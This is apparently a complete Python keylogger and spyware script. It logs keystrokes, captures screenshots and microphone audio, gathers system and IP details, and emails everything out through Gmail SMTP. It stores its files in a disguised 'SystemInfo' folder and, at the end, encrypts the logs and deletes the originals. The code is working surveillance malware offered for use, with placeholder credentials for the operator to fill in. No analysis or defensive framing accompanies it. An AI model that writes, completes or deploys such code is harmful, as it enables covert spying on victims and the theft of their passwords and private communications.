#imports
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.audio import MIMEAudio
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
from requests import get
from multiprocessing import Process, freeze_support
import socket,platform,time,os,smtplib,getpass,pyautogui
import sounddevice as sd
import getpass

#path setup and file hiding
username = getpass.getuser()
filepath = "C:\\Users\\" + username+ "\\SystemInfo"
try:
    os.mkdir(filepath)
except:
    pass

#other var setup
logpath = "\\report.txt"
syspath = "\\info.txt"
encryptedlog = "\\ereport.txt"
encryptedsys = "\\einfo.txt"
audiopath = "\\audio"
imagepath = "\\img"
email_address = "your@gmail.com" #your gmail
email_password = "insertyourpass" #your pass
microphoneTime = 20
periodOfAction = 10

#globals
global screenshot, audio
screenshot = 0 
audio = 0
k = 0 

timerIterations = 0
timeIteration = 20
currentTime = time.time()
stoppingTime = time.time() + timeIteration

keyspressed = []
i = 0

while timerIterations < periodOfAction:
        
    def on_press(key):
        global keyspressed, i, currentTime
        keyspressed.append(key)
        i += 1
        currentTime = time.time()

        #clears keyspressed string for every key
        if i >= 1:
            i = 0
            write_file(keyspressed)
            keyspressed = []

    def write_file(keyspressed):
        with open(filepath + logpath, "a") as f:
            for key in keyspressed:
                #removes single quotes
                new_key = str(key).replace("'","")
                if new_key.find("space") > 0:
                    f.write('\n')
                    f.close()
                #if it isnt finding any key stop looking for it until update on listener
                elif new_key.find("Key") == -1:
                    f.write(new_key)
                    f.close()

                elif new_key.find("\n"):
                    f.write("\n")

    def on_release(key):
        if currentTime > stoppingTime:
            return False

    def send_email(filename, attachment, towho):
        try:
            #currently using same email to send and to receive, ideal would be to have two separate so the 'user' cant have access to account and infoo
            incoming = email_address
            msg = MIMEMultipart()
            msg['From'] = incoming
            msg['To'] = towho

            try:   
                msg['Subject'] = "report " + str(socket.gethostbyname(socket.gethostname()))
                body = "this is your report sent from: " + str(socket.gethostbyname(socket.gethostname()))
            except Exception:
                msg['Subject'] = "report"
                body = "this is your report"

            msg.attach(MIMEText(body,'plain'))
            filename = filename
            attachment = open(attachment, 'rb')
            p = MIMEBase('application', 'octet-stream')
            p.set_payload((attachment).read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(p)
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(email_address, email_password)
            text = msg.as_string()
            s.sendmail(email_address, towho, text)
            s.quit()
        except:
            pass
    
    def email_audio(filename, attachment, towho):
        try:
            #currently using same email to send and to receive, ideal would be to have two separate so the 'user' cant have access to account and infoo
            incoming = email_address
            msg = MIMEMultipart()
            msg['From'] = incoming
            msg['To'] = towho   

            try:   
                msg['Subject'] = "audio " + str(socket.gethostbyname(socket.gethostname()))
                body = "this is your audio sent from: " + str(socket.gethostbyname(socket.gethostname()))
            except Exception:
                msg['Subject'] = "audio"
                body = "this is your audio"

            msg.attach(MIMEText(body,'plain'))
            filename = filename
            attachment = open(attachment, 'rb')
            audio = MIMEAudio(attachment.read())
            audio.set_payload((attachment).read())
            encoders.encode_base64(audio)
            audio.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(audio)
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(email_address, email_password)
            text = msg.as_string()
            s.sendmail(email_address, towho, text)
            s.quit()
        except:
            pass

    def email_image(filename, attachment, towho):
        try:
            #currently using same email to send and to receive, ideal would be to have two separate so the 'user' cant have access to account and infoo
            incoming = email_address
            msg = MIMEMultipart()
            msg['From'] = incoming
            msg['To'] = towho   
            
            try:   
                msg['Subject'] = "image " + str(socket.gethostbyname(socket.gethostname()))
                body = "this is your image sent from: " + str(socket.gethostbyname(socket.gethostname()))
            except Exception:
                msg['Subject'] = "image"
                body = "this is your image"

            msg.attach(MIMEText(body,'plain'))
            filename = filename
            attachment = open(attachment, 'rb')
            image = MIMEImage(attachment.read())
            image.set_payload((attachment).read())
            encoders.encode_base64(image)
            image.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(image)
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(email_address, email_password)
            text = msg.as_string()
            s.sendmail(email_address, towho, text)
            s.quit()
        except:
            pass

    #gets os info
    def comp_info():
        with open(filepath + syspath, "w") as g:
            hostname = socket.gethostname()
            ipv4 = socket.gethostbyname(hostname)
            try:
                public_ipv4 = get("https://api.ipify.org").text
                g.write("public ip address: " + public_ipv4 + "\n")

            except Exception:
                g.write("couldn't get public ip\n")

            g.write("processor: " + platform.processor() + "\n")
            g.write("os: " + platform.system() + " " + platform.version() + "\n")
            g.write("machine: " + platform.machine() + "\n")
            g.write("hostname: " + hostname + "\n")
            g.write("private ip: " + ipv4 + "\n")

    comp_info()

    #capture's microphone audio
    def get_audio(audio):
        freq = 44100
        time = microphoneTime
        audiostr = str(audio)

        recording = sd.rec(int(time*freq), samplerate=freq, channels=2)
        sd.wait()

        write(filepath + audiopath + audiostr + ".wav", freq, recording)
        audio += 1
        return audio

    #takes screenshot
    def get_screen(screenshot):
        screenshotstr = str(screenshot)
        try:
            image = pyautogui.screenshot()
            image.save(filepath + imagepath + screenshotstr + ".png")
            screenshot += 1
        except Exception:
            screenshot += 0

        return screenshot

    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        screenshot = get_screen(screenshot)
        audio = get_audio(audio)
        email_audio("audio"+str(audio), filepath+audiopath+str(audio), email_address)
        email_image("shot"+str(screenshot), filepath+imagepath+str(screenshot), email_address)
        send_email("keylog"+str(k), filepath+logpath, email_address)
        send_email("sysinfo"+str(k), filepath+syspath, email_address)
        k+=1
        timerIterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + timeIteration

j = 0
toEncrypt = [filepath + logpath, filepath + syspath]
encrypted = [filepath + encryptedlog, filepath + encryptedsys]

#file encryption loop
for file in toEncrypt:
    with open(toEncrypt[j], 'rb') as f:
        data = f.read()
        
    encryptedData = Fernet("xheNiDEWth3vz8raCmrVjkbab1fBvFArMZHIPNuWkQs=").encrypt(data)

    with open(encrypted[j], "wb") as g:
        g.write(encryptedData)

    #deletes the original file(non encrypted) 
    os.remove(toEncrypt[j])
    j += 1

time.sleep(10)